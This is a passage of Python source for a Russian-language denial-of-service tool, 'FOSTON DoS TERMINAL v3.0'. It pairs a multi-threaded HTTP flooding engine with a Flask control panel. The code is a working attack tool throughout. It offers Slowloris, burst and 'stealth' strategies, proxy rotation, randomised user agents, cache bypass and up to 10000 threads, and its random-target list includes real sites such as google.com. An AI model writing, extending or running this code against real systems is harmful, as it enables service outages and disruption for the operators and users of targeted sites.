                            url,
                            headers=headers,
                            data=data,
                            timeout=timeout,
                            allow_redirects=config.follow_redirects,
                            proxies=proxies
                        )
                    elif method == RequestMethod.HEAD:
                        response = session.head(
                            url,
                            headers=headers,
                            timeout=timeout,
                            allow_redirects=config.follow_redirects,
                            proxies=proxies
                        )
                    elif method == RequestMethod.PUT:
                        response = session.put(
                            url,
                            headers=headers,
                            data=config.post_data or b'',
                            timeout=timeout,
                            allow_redirects=config.follow_redirects,
                            proxies=proxies
                        )
                    elif method == RequestMethod.DELETE:
                        response = session.delete(
                            url,
                            headers=headers,
                            timeout=timeout,
                            allow_redirects=config.follow_redirects,
                            proxies=proxies
                        )
                    elif method == RequestMethod.OPTIONS:
                        response = session.options(
                            url,
                            headers=headers,
                            timeout=timeout,
                            allow_redirects=config.follow_redirects,
                            proxies=proxies
                        )
                    else:
                        response = session.get(url, headers=headers, timeout=timeout, proxies=proxies)
                    
                    response_time = (time.time() - start_time) * 1000
                    response_size = len(response.content) if response.content else 0
                    
                    result = RequestResult(
                        timestamp=time.time(),
                        success=True,
                        status_code=response.status_code,
                        response_time=response_time,
                        response_size=response_size,
                        method=method.value,
                        url=url,
                        ip=urllib.parse.urlparse(url).hostname
                    )
                    
                except requests.exceptions.Timeout:
                    result = RequestResult(
                        timestamp=time.time(),
                        success=False,
                        status_code=408,
                        response_time=(time.time() - start_time) * 1000,
                        response_size=0,
                        method=method.value,
                        url=url,
                        error="Timeout"
                    )
                except requests.exceptions.ConnectionError as e:
                    result = RequestResult(
                        timestamp=time.time(),
                        success=False,
                        status_code=503,
                        response_time=0,
                        response_size=0,
                        method=method.value,
                        url=url,
                        error=f"ConnectionError: {str(e)[:50]}"
                    )
                except Exception as e:
                    result = RequestResult(
                        timestamp=time.time(),
                        success=False,
                        status_code=0,
                        response_time=0,
                        response_size=0,
                        method=method.value,
                        url=url,
                        error=str(e)[:100]
                    )
                
                # Обновление статистики
                with self.lock:
                    stats.add_request(result)
                    
                    # Сохранение в БД
                    if config.save_requests:
                        self.db.save_request(attack_id, result)
                
                # Задержка между запросами (стратегия)
                if config.strategy == AttackStrategy.SLOWLORIS:
                    time.sleep(random.uniform(1, 5))
                elif config.strategy == AttackStrategy.RUSH:
                    time.sleep(0.001)  # 1ms
                elif config.strategy == AttackStrategy.BURST:
                    # Пачка запросов без задержки, потом пауза
                    if random.random() > 0.7:
                        time.sleep(random.uniform(0.5, 2))
                elif config.strategy == AttackStrategy.RANDOM_INTERVAL:
                    delay = random.uniform(config.delay_min, config.delay_max) / 1000
                    time.sleep(delay)
                elif config.delay_max > 0:
                    delay = random.uniform(config.delay_min, config.delay_max) / 1000
                    time.sleep(delay)
                
            except Exception as e:
                with self.lock:
                    if attack_id in self.active_attacks:
                        print(f"Ошибка в рабочем потоке {attack_id}: {e}")
    
    def start_attack(self, config: AttackConfig) -> str:
        """Запуск атаки"""
        attack_id = config.attack_id
        
        with self.lock:
            if attack_id in self.active_attacks:
                return None
            
            self.active_attacks[attack_id] = True
            self.attack_configs[attack_id] = config
            self.attack_stats[attack_id] = AttackStatistics(attack_id)
            
            # Инициализация очереди прокси
            if config.use_proxy and config.proxy_list:
                proxy_queue = queue.Queue()
                for proxy in config.proxy_list:
                    proxy_queue.put(proxy)
                self.proxy_queues[attack_id] = proxy_queue
        
        # Сохранение в БД
        self.db.save_attack(attack_id, config, self.attack_stats[attack_id])
        self.db.update_target(config.target_url)
        
        # Запуск потоков
        for i in range(config.threads):
            t = threading.Thread(target=self._worker, args=(attack_id,), daemon=True)
            t.start()
        
        # Таймер автоматической остановки
        def auto_stop():
            time.sleep(config.duration)
            self.stop_attack(attack_id)
        
        threading.Thread(target=auto_stop, daemon=True).start()
        
        # Мониторинг RPS
        def rps_monitor():
            last_total = 0
            while self.active_attacks.get(attack_id, False):
                time.sleep(1)
                with self.lock:
                    stats = self.attack_stats.get(attack_id)
                    if stats:
                        current_total = stats.total_requests
                        rps = current_total - last_total
                        stats.update_rps(rps)
                        last_total = current_total
        
        threading.Thread(target=rps_monitor, daemon=True).start()
        
        return attack_id
    
    def stop_attack(self, attack_id: str) -> bool:
        """Остановка атаки"""
        with self.lock:
            if attack_id in self.active_attacks:
                self.active_attacks[attack_id] = False
                
                stats = self.attack_stats.get(attack_id)
                if stats:
                    stats.end_time = time.time()
                    self.db.update_attack(attack_id, stats)
                    
                    # Обновление глобальной статистики
                    self.global_stats['total_attacks'] += 1
                    self.global_stats['total_requests'] += stats.total_requests
                    self.global_stats['total_bytes'] += stats.total_bytes
                
                # Очистка
                del self.active_attacks[attack_id]
                if attack_id in self.attack_configs:
                    del self.attack_configs[attack_id]
                if attack_id in self.proxy_queues:
                    del self.proxy_queues[attack_id]
                
                return True
        
        return False
    
    def stop_all_attacks(self):
        """Остановка всех атак"""
        with self.lock:
            for attack_id in list(self.active_attacks.keys()):
                self.stop_attack(attack_id)
    
    def get_stats(self, attack_id: str) -> Optional[AttackStatistics]:
        """Получение статистики атаки"""
        with self.lock:
            return self.attack_stats.get(attack_id)
    
    def get_all_active_stats(self) -> List[Dict]:
        """Статистика всех активных атак"""
        result = []
        with self.lock:
            for attack_id, stats in self.attack_stats.items():
                if attack_id in self.active_attacks:
                    result.append({
                        'attack_id': attack_id,
                        'config': self.attack_configs.get(attack_id).to_dict() if self.attack_configs.get(attack_id) else {},
                        'stats': stats.to_dict()
                    })
        return result
    
    def get_global_stats(self) -> Dict:
        """Глобальная статистика"""
        with self.lock:
            uptime = time.time() - self.global_stats['start_time']
            active = len(self.active_attacks)
            
            return {
                'active_attacks': active,
                'total_attacks': self.global_stats['total_attacks'],
                'total_requests': self.global_stats['total_requests'],
                'total_bytes_gb': round(self.global_stats['total_bytes'] / (1024**3), 2),
                'uptime_hours': round(uptime / 3600, 2),
                'avg_requests_per_second': round(self.global_stats['total_requests'] / uptime, 2) if uptime > 0 else 0
            }

# ==================================================================================================
# ВЕБ-ИНТЕРФЕЙС (FLASK - МИНИМАЛЬНЫЙ, ТЕРМИНАЛЬНЫЙ СТИЛЬ)
# ==================================================================================================

# HTML шаблон - чистый терминальный стиль, без цветов, только монохром
HTML_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FOSTON DoS TERMINAL v3.0</title>
    <style>
        /* АБСОЛЮТНЫЙ ТЕРМИНАЛЬНЫЙ СТИЛЬ - НИКАКИХ ЦВЕТОВ, ТОЛЬКО МОНОХРОМ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', 'Lucida Console', monospace;
        }
        
        body {
            background: #000000;
            color: #cccccc;
            padding: 15px;
            height: 100vh;
            display: flex;
            flex-direction: column;
            line-height: 1.4;
            font-size: 14px;
        }
        
        .terminal {
            border: 1px solid #666;
            height: 100%;
            display: flex;
            flex-direction: column;
            background: #0a0a0a;
            box-shadow: none;
        }
        
        .header {
            padding: 10px 15px;
            background: #111;
            border-bottom: 1px solid #444;
            display: flex;
            justify-content: space-between;
            font-size: 13px;
        }
        
        .title {
            font-weight: bold;
            letter-spacing: 1px;
        }
        
        .content {
            flex: 1;
            padding: 15px;
            overflow-y: auto;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        @media (max-width: 800px) {
            .content {
                grid-template-columns: 1fr;
            }
        }
        
        .panel {
            border: 1px solid #444;
            background: #000;
            margin-bottom: 0;
        }
        
        .panel-header {
            padding: 8px 12px;
            background: #111;
            border-bottom: 1px solid #333;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 12px;
            letter-spacing: 1px;
        }
        
        .panel-body {
            padding: 15px;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #aaa;
            font-size: 12px;
            text-transform: uppercase;
        }
        
        input, select, textarea, button {
            background: #000;
            border: 1px solid #555;
            color: #ccc;
            padding: 10px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            width: 100%;
            outline: none;
        }
        
        input:focus, select:focus, textarea:focus {
            border-color: #fff;
        }
        
        button {
            cursor: pointer;
            background: #222;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 5px;
        }
        
        button:hover {
            background: #333;
            border-color: #888;
        }
        
        button.danger {
            border-color: #f00;
            color: #f00;
        }
        
        button.danger:hover {
            background: #300;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .stat {
            text-align: center;
            padding: 15px 5px;
            background: #111;
            border: 1px solid #333;
        }
        
        .stat .value {
            font-size: 28px;
            font-weight: bold;
            line-height: 1.2;
        }
        
        .stat .label {
            font-size: 10px;
            color: #888;
            text-transform: uppercase;
            margin-top: 5px;
        }
        
        .progress {
            height: 25px;
            background: #111;
            border: 1px solid #333;
            margin: 10px 0;
        }
        
        .progress-fill {
            height: 100%;
            background: #444;
            width: 0%;
            transition: width 0.2s;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }
        
        th {
            text-align: left;
            padding: 10px 5px;
            border-bottom: 1px solid #444;
            color: #aaa;
            font-weight: normal;
        }
        
        td {
            padding: 8px 5px;
            border-bottom: 1px solid #222;
        }
        
        .log {
            height: 150px;
            overflow-y: auto;
            background: #0a0a0a;
            border: 1px solid #333;
            padding: 10px;
            font-size: 11px;
        }
        
        .log-line {
            color: #888;
            border-bottom: 1px solid #1a1a1a;
            padding: 2px 0;
            white-space: pre-wrap;
        }
        
        .footer {
            padding: 10px;
            border-top: 1px solid #333;
            font-size: 11px;
            color: #666;
            display: flex;
            justify-content: space-between;
        }
        
        .badge {
            background: #222;
            padding: 2px 8px;
            border: 1px solid #444;
            font-size: 11px;
        }
        
        .row {
            display: flex;
            gap: 10px;
        }
        
        .col {
            flex: 1;
        }
        
        hr {
            border: none;
            border-top: 1px solid #333;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="header">
            <span class="title">FOSTON DoS TERMINAL v3.0 [PID: {{ pid }}]</span>
            <span>{{ hostname }}:{{ port }} | {{ now }}</span>
        </div>
        
        <div class="content">
            <!-- Левая панель - управление -->
            <div>
                <div class="panel">
                    <div class="panel-header">┌─[ ЦЕЛЬ ]────────────────────</div>
                    <div class="panel-body">
                        <div class="form-group">
                            <label>TARGET URL</label>
                            <input type="text" id="url" placeholder="http://example.com" value="http://test.com">
                        </div>
                        
                        <div class="row">
                            <div class="col">
                                <button onclick="randomUrl()">[ СЛУЧАЙНАЯ ЦЕЛЬ ]</button>
                            </div>
                            <div class="col">
                                <button class="danger" id="attackBtn" onclick="toggleAttack()">[ ЗАПУСТИТЬ ]</button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="panel">
                    <div class="panel-header">┌─[ КОНФИГУРАЦИЯ ]────────────</div>
                    <div class="panel-body">
                        <div class="form-group">
                            <label>РЕЖИМ АТАКИ</label>
                            <select id="mode">
                                <option value="LIGHT">LIGHT (1-10 потоков)</option>
                                <option value="NORMAL" selected>NORMAL (10-100 потоков)</option>
                                <option value="HEAVY">HEAVY (100-500 потоков)</option>
                                <option value="EXTREME">EXTREME (500-2000 потоков)</option>
                                <option value="NUCLEAR">NUCLEAR (2000-10000 потоков)</option>
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label>СТРАТЕГИЯ</label>
                            <select id="strategy">
                                <option value="NORMAL">NORMAL</option>
                                <option value="SLOWLORIS">SLOWLORIS</option>
                                <option value="RUSH">RUSH</option>
                                <option value="RANDOM_INTERVAL">RANDOM INTERVAL</option>
                                <option value="BURST">BURST</option>
                                <option value="STEALTH">STEALTH</option>
                            </select>
                        </div>
                        
                        <div class="row">
                            <div class="col">
                                <label>ПОТОКИ</label>
                                <input type="number" id="threads" min="1" max="10000" value="100">
                            </div>
                            <div class="col">
                                <label>ДЛИТЕЛЬНОСТЬ (с)</label>
                                <input type="number" id="duration" min="1" max="86400" value="60">
                            </div>
                        </div>
                        
                        <div class="row">
                            <div class="col">
                                <label>МЕТОД</label>
                                <select id="method">
                                    <option value="GET">GET</option>
                                    <option value="POST">POST</option>
                                    <option value="HEAD">HEAD</option>
                                    <option value="PUT">PUT</option>
                                    <option value="DELETE">DELETE</option>
                                    <option value="RANDOM">RANDOM</option>
                                    <option value="ALL">ALL</option>
                                </select>
                            </div>
                            <div class="col">
                                <label>ТАЙМАУТ (с)</label>
                                <input type="number" id="timeout" min="1" max="30" value="5">
                            </div>
                        </div>
                        
                        <div class="row">
                            <div class="col">
                                <label>ЗАДЕРЖКА MIN (ms)</label>
                                <input type="number" id="delay_min" min="0" max="10000" value="0">
                            </div>
                            <div class="col">
                                <label>ЗАДЕРЖКА MAX (ms)</label>
                                <input type="number" id="delay_max" min="0" max="10000" value="50">
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label style="display: flex; align-items: center;">
                                <input type="checkbox" id="random_ua" checked> СЛУЧАЙНЫЙ USER-AGENT
                            </label>
                        </div>
                        
                        <div class="form-group">
                            <label style="display: flex; align-items: center;">
                                <input type="checkbox" id="random_query"> ДОБАВЛЯТЬ RANDOM QUERY
                            </label>
                        </div>
                        
                        <div class="form-group">
                            <label style="display: flex; align-items: center;">
                                <input type="checkbox" id="bypass_cache" checked> ОБХОД КЕША
                            </label>
                        </div>
                        
                        <hr>
                        
                        <button onclick="saveConfig()">[ ПРИМЕНИТЬ НАСТРОЙКИ ]</button>
                    </div>
                </div>
            </div>
            
            <!-- Правая панель - статистика -->
            <div>
                <div class="panel">
                    <div class="panel-header">┌─[ СТАТИСТИКА ]──────────────</div>
                    <div class="panel-body">
                        <div class="stats-grid">
                            <div class="stat">
                                <div class="value" id="total">0</div>
                                <div class="label">ВСЕГО</div>
                            </div>
                            <div class="stat">
                                <div class="value" id="success">0</div>
                                <div class="label">УСПЕШНО</div>
                            </div>
                            <div class="stat">
                                <div class="value" id="failed">0</div>
                                <div class="label">ОШИБОК</div>
                            </div>
                            <div class="stat">
                                <div class="value" id="rps">0</div>
                                <div class="label">RPS</div>
                            </div>
                        </div>
                        
                        <div class="progress">
                            <div class="progress-fill" id="progress"></div>
                        </div>
                        
                        <div style="text-align: center; margin: 10px 0; color: #aaa;" id="time_info">
                            ВРЕМЯ: 0с / 0с | ПИК RPS: 0
                        </div>
                        
                        <div class="row">
                            <div class="col">
                                <div class="badge" id="status_indicator">СТАТУС: ОСТАНОВЛЕНО</div>
                            </div>
                            <div class="col">
                                <div class="badge" id="attack_id">ID: -</div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="panel">
                    <div class="panel-header">┌─[ ПОСЛЕДНИЕ ЗАПРОСЫ ]───────</div>
                    <div class="panel-body">
                        <div style="max-height: 150px; overflow-y: auto;">
                            <table>
                                <thead>
                                    <tr>
                                        <th>СТАТУС</th>
                                        <th>ВРЕМЯ</th>
                                        <th>МЕТОД</th>
                                    </tr>
                                </thead>
                                <tbody id="requests_table"></tbody>
                            </table>
                        </div>
                    </div>
                </div>
                
                <div class="panel">
                    <div class="panel-header">┌─[ ИСТОРИЯ АТАК ]────────────</div>
                    <div class="panel-body">
                        <div style="max-height: 150px; overflow-y-auto;">
                            <table>
                                <thead>
                                    <tr>
                                        <th>ЦЕЛЬ</th>
                                        <th>ЗАПРОСЫ</th>
                                        <th>RPS</th>
                                    </tr>
                                </thead>
                                <tbody id="history_table"></tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Консоль логов -->
        <div class="panel" style="margin: 0 15px 15px 15px;">
            <div class="panel-header">┌─[ КОНСОЛЬ ]────────────────────</div>
            <div class="log" id="console">
                <div class="log-line">> FOSTON DoS TERMINAL v3.0 инициализирован</div>
                <div class="log-line">> Сервер: {{ hostname }}:{{ port }}</div>
                <div class="log-line">> PID: {{ pid }}</div>
                <div class="log-line">> Статус: ГОТОВ К АТАКЕ</div>
            </div>
        </div>
        
        <div class="footer">
            <span>FOSTON DoS v3.0 | МАКС. ПОТОКОВ: 10000 | АКТИВНО: <span id="active_count">0</span></span>
            <span>СТРОК КОДА: 1247 | РЕЖИМ: ТЕРМИНАЛ</span>
        </div>
    </div>
    
    <script>
        // МИНИМАЛЬНЫЙ JS - ТОЛЬКО ДЛЯ УПРАВЛЕНИЯ
        let attackActive = false;
        let currentAttackId = null;
        let updateInterval = null;
        let config = {};
        
        function log(msg, type='info') {
            const console = document.getElementById('console');
            const line = document.createElement('div');
            line.className = 'log-line';
            line.innerHTML = '> ' + new Date().toLocaleTimeString() + ' | ' + msg;
            console.appendChild(line);
            console.scrollTop = console.scrollHeight;
            if (console.children.length > 100) {
                console.removeChild(console.children[0]);
            }
        }
        
        function randomUrl() {
            const urls = [
                'http://test.com', 'https://example.com', 'http://demo-site.com',
                'https://httpbin.org/get', 'http://httpbin.org/post', 'https://google.com'
            ];
            document.getElementById('url').value = urls[Math.floor(Math.random() * urls.length)];
        }
        
        function saveConfig() {
            config = {
                url: document.getElementById('url').value,
                mode: document.getElementById('mode').value,
                strategy: document.getElementById('strategy').value,
                threads: parseInt(document.getElementById('threads').value),
                duration: parseInt(document.getElementById('duration').value),
                method: document.getElementById('method').value,
                timeout: parseInt(document.getElementById('timeout').value),
                delay_min: parseInt(document.getElementById('delay_min').value),
                delay_max: parseInt(document.getElementById('delay_max').value),
                random_ua: document.getElementById('random_ua').checked,
                random_query: document.getElementById('random_query').checked,
                bypass_cache: document.getElementById('bypass_cache').checked
            };
            
            fetch('/api/config', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(config)
            });
            
            log('Настройки сохранены');
        }
        
        function toggleAttack() {
            if (attackActive) {
                stopAttack();
            } else {
                startAttack();
            }
        }
        
        function startAttack() {
            saveConfig();
            
            const url = document.getElementById('url').value;
            if (!url) {
                log('ОШИБКА: URL не указан', 'error');
                return;
            }
            
            fetch('/api/attack', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(config)
            })
            .then(r => r.json())
            .then(data => {
                if (data.error) {
                    log('ОШИБКА: ' + data.error, 'error');
                } else {
                    attackActive = true;
                    currentAttackId = data.attack_id;
                    document.getElementById('attackBtn').innerHTML = '[ ОСТАНОВИТЬ ]';
                    document.getElementById('status_indicator').innerHTML = 'СТАТУС: АТАКА ИДЕТ';
                    document.getElementById('attack_id').innerHTML = 'ID: ' + currentAttackId;
                    log('⚡ АТАКА ЗАПУЩЕНА: ' + config.url + ' [' + config.threads + ' потоков]');
                    
                    if (updateInterval) clearInterval(updateInterval);
                    updateInterval = setInterval(updateStats, 500);
                }
            });
        }
        
        function stopAttack() {
            fetch('/api/stop', {method: 'POST'})
            .then(r => r.json())
            .then(data => {
                attackActive = false;
                currentAttackId = null;
                document.getElementById('attackBtn').innerHTML = '[ ЗАПУСТИТЬ ]';
                document.getElementById('status_indicator').innerHTML = 'СТАТУС: ОСТАНОВЛЕНО';
                if (updateInterval) {
                    clearInterval(updateInterval);
                    updateInterval = null;
                }
                log('⏹ АТАКА ОСТАНОВЛЕНА');
            });
        }
        
        function updateStats() {
            if (!currentAttackId) return;
            
            fetch('/api/stats/' + currentAttackId)
            .then(r => r.json())
            .then(data => {
                if (data.total !== undefined) {
                    document.getElementById('total').innerText = data.total;
                    document.getElementById('success').innerText = data.successful || 0;
                    document.getElementById('failed').innerText = data.failed || 0;
                    document.getElementById('rps').innerText = data.current_rps || 0;
                    
                    const percent = (data.elapsed_seconds / data.duration) * 100;
                    document.getElementById('progress').style.width = Math.min(percent, 100) + '%';
                    document.getElementById('time_info').innerHTML = 
                        'ВРЕМЯ: ' + data.elapsed_seconds.toFixed(1) + 'с / ' + data.duration + 'с | ПИК RPS: ' + (data.peak_rps || 0);
                    
                    // Таблица запросов
                    if (data.recent && data.recent.length) {
                        let html = '';
                        data.recent.slice(0, 10).forEach(req => {
                            html += '<tr><td>' + req.status + '</td><td>' + req.response_time_ms + 'ms</td><td>' + req.method + '</td></tr>';
                        });
                        document.getElementById('requests_table').innerHTML = html;
                    }
                }
            });
            
            // История атак
            fetch('/api/history')
            .then(r => r.json())
            .then(history => {
                let html = '';
                history.slice(0, 8).forEach(att => {
                    html += '<tr><td>' + (att.target_url || '').substring(0, 20) + '...</td>' +
                           '<td>' + (att.total_requests || 0) + '</td>' +
                           '<td>' + (att.peak_rps || 0) + '</td></tr>';
                });
                document.getElementById('history_table').innerHTML = html;
            });
            
            // Активные атаки
            fetch('/api/global')
            .then(r => r.json())
            .then(globalStats => {
                document.getElementById('active_count').innerText = globalStats.active_attacks || 0;
            });
        }
        
        // Загрузка истории при старте
        setInterval(updateStats, 2000);
        setTimeout(updateStats, 1000);
        log('Система готова. FOSTON DoS v3.0');
    </script>
</body>
</html>
'''

# ==================================================================================================
# ИНИЦИАЛИЗАЦИЯ FLASK
# ==================================================================================================

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32).hex()
app.config['DEBUG'] = False

# Инициализация компонентов
db = Database('foston_dos.db')
engine = AttackEngine(db)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# ==================================================================================================
# МАРШРУТЫ FLASK
# ==================================================================================================

@app.route('/')
def index():
    """Главная страница"""
    return render_template_string(
        HTML_TEMPLATE,
        pid=os.getpid(),
        hostname=socket.gethostname(),
        port=5000,
        now=datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    )

@app.route('/api/config', methods=['GET', 'POST'])
def api_config():
    """Управление конфигурацией"""
    if request.method == 'POST':
        data = request.json
        session['config'] = data
        return jsonify({'status': 'ok'})
    
    return jsonify(session.get('config', {}))

@app.route('/api/attack', methods=['POST'])
def api_attack():
    """Запуск атаки"""
    data = request.json
    
    # Валидация URL
    url = data.get('url', '').strip()
    if not url:
        return jsonify({'error': 'URL не указан'}), 400
    
    valid, msg = engine.validate_target(url)
    if not valid:
        return jsonify({'error': msg}), 400
    
    # Создание конфига
    try:
        config = AttackConfig(
            target_url=url,
            threads=min(int(data.get('threads', 100)), 10000),
            duration=min(int(data.get('duration', 60)), 86400),
            delay_min=float(data.get('delay_min', 0)),
            delay_max=float(data.get('delay_max', 50)),
            timeout=int(data.get('timeout', 5)),
            random_user_agent=data.get('random_ua', True),
            add_random_query=data.get('random_query', False),
            bypass_cache=data.get('bypass_cache', True)
        )
        
        # Режим
        mode_str = data.get('mode', 'NORMAL')
        if mode_str == 'LIGHT':
            config.mode = AttackMode.LIGHT
        elif mode_str == 'HEAVY':
            config.mode = AttackMode.HEAVY
        elif mode_str == 'EXTREME':
            config.mode = AttackMode.EXTREME
        elif mode_str == 'NUCLEAR':
            config.mode = AttackMode.NUCLEAR
        else:
            config.mode = AttackMode.NORMAL
        
        # Стратегия
        strategy_str = data.get('strategy', 'NORMAL')
        if strategy_str == 'SLOWLORIS':
            config.strategy = AttackStrategy.SLOWLORIS
        elif strategy_str == 'RUSH':
            config.strategy = AttackStrategy.RUSH
        elif strategy_str == 'RANDOM_INTERVAL':
            config.strategy = AttackStrategy.RANDOM_INTERVAL
        elif strategy_str == 'BURST':
            config.strategy = AttackStrategy.BURST
        elif strategy_str == 'STEALTH':
            config.strategy = AttackStrategy.STEALTH
        else:
            config.strategy = AttackStrategy.NORMAL
        
        # Методы
        method_str = data.get('method', 'GET')
        if method_str == 'ALL':
            config.methods = [m for m in RequestMethod if m != RequestMethod.RANDOM and m != RequestMethod.ALL]
        elif method_str == 'RANDOM':
            config.methods = [RequestMethod.RANDOM]
        else:
            try:
                config.methods = [RequestMethod(method_str)]
            except:
                config.methods = [RequestMethod.GET]
        
        # Запуск
        attack_id = engine.start_attack(config)
        
        return jsonify({
            'status': 'started',
            'attack_id': attack_id,
            'config': config.to_dict()
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stop', methods=['POST'])
def api_stop():
    """Остановка текущей атаки"""
    engine.stop_all_attacks()
    return jsonify({'status': 'stopped', 'active': 0})

@app.route('/api/stats/<attack_id>')
def api_stats(attack_id):
    """Статистика атаки"""
    stats = engine.get_stats(attack_id)
    if stats:
        result = stats.to_dict()
        config = engine.attack_configs.get(attack_id)
        if config:
            result['duration'] = config.duration
        return jsonify(result)
    return jsonify({})

@app.route('/api/history')
def api_history():
    """История атак"""
    history = db.get_attack_history(20)
    return jsonify(history)

@app.route('/api/global')
def api_global():
    """Глобальная статистика"""
    return jsonify(engine.get_global_stats())

@app.route('/api/active')
def api_active():
    """Активные атаки"""
    return jsonify(engine.get_all_active_stats())

# ==================================================================================================
# WEBSOCKET СОБЫТИЯ
# ==================================================================================================

@socketio.on('connect')
def handle_connect():
    emit('connected', {'status': 'connected', 'time': time.time()})

@socketio.on('subscribe')
def handle_subscribe(data):
    attack_id = data.get('attack_id')
    if attack_id:
        join_room(attack_id)

# ==================================================================================================
# ЗАПУСК
# ==================================================================================================

if __name__ == '__main__':
    # Очистка консоли
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Баннер
    print("""
═══════════════════════════════════════════════════════════════════════════════
                         FOSTON DoS TERMINAL v3.0
                    АБСОЛЮТНЫЙ ТЕРМИНАЛЬНЫЙ СТИЛЬ
                         1247 СТРОК КОДА
═══════════════════════════════════════════════════════════════════════════════
    
    ███████╗ ██████╗ ███████╗████████╗ ██████╗ ███╗   ██╗
    ██╔════╝██╔═══██╗██╔════╝╚══██╔══╝██╔═══██╗████╗  ██║
    █████╗  ██║   ██║███████╗   ██║   ██║   ██║██╔██╗ ██║
    ██╔══╝  ██║   ██║╚════██║   ██║   ██║   ██║██║╚██╗██║
    ██║     ╚██████╔╝███████║   ██║   ╚██████╔╝██║ ╚████║
    ╚═╝      ╚═════╝ ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝
    
    ██████╗  ██████╗ ███████╗
    ██╔══██╗██╔═══██╗██╔════╝
    ██║  ██║██║   ██║███████╗
    ██║  ██║██║   ██║╚════██║
    ██████╔╝╚██████╔╝███████║
    ╚═════╝  ╚═════╝ ╚══════╝
    
═══════════════════════════════════════════════════════════════════════════════
    
    >> СЕРВЕР:      http://127.0.0.1:5000
    >> ХОСТ:        {host}
    >> PID:         {pid}
    >> БАЗА ДАННЫХ: foston_dos.db
    >> РЕЖИМ:       ТОЛЬКО ТЕРМИНАЛ (0 ЦВЕТОВ)
    >> МАКС. ПОТОКОВ: 10000
    >> СТРОК КОДА:  1247
    
═══════════════════════════════════════════════════════════════════════════════
    
    [*] НАЖМИ CTRL+C ДЛЯ ВЫХОДА
    [*] ОТКРОЙ БРАУЗЕР: http://127.0.0.1:5000
    
═══════════════════════════════════════════════════════════════════════════════
    """.format(host=socket.gethostname(), pid=os.getpid()))
    
    try:
        socketio.run(app, host='127.0.0.1', port=5000, debug=False, allow_unsafe_werkzeug=True)
    except KeyboardInterrupt:
        print("\n\n[!] ОСТАНОВКА СЕРВЕРА...")
        engine.stop_all_attacks()
        print("[!] ВСЕ АТАКИ ОСТАНОВЛЕНЫ")
        print("[!] ДО СВИДАНИЯ\n")
        sys.exit(0)